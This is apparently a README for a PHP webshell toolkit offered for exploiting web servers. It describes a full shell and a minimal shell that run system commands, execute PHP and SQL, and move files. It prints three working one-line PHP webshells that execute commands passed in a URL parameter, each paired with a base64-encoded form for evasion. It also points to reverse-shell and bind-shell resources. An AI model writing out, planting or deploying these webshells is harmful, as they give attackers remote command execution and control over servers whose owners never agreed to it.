## PHP Webshell

This is a simple yet useful PHP webshell.
It is compatible with PHP > 5.2

This webshell comes in two flavours :
- shell.php : fully featured webshell to exploit
- mini.php : lightweight, only essential features

### Features

shell.php
- browse server's directory tree
- read, edit, delete, upload and download file
- Execute system commands
- Execute PHP code
- Execute MySql/PgSql/SQLite queries

mini.php
- Execute system commands
- Execute PHP code
- Upload file

### More content

Another file is available : `mini-b64.txt`

This is the base64 version of mini.php. It does not contain '+' and '/' chars to avoid URL encoding and other possible issues.

### Even more tricks

##### Tiny PHP shell

```
<?=`$_GET[0]`?>					IDw/PWAkX0dFVFswXWA/Pg==
<?=exec($_GET[0])?>				PD89ZXhlYygkX0dFVFswXSk/Pg==
<?php system($_GET[0]); ?>		PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=
```


#### Upgrade to a more interactive shell

PHP reverse shell : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

PHP bind shell : https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#php


##### Good resources about shells
https://www.revshells.com/

https://yolospacehacker.com/hackersguide/en/?cat=Webshell
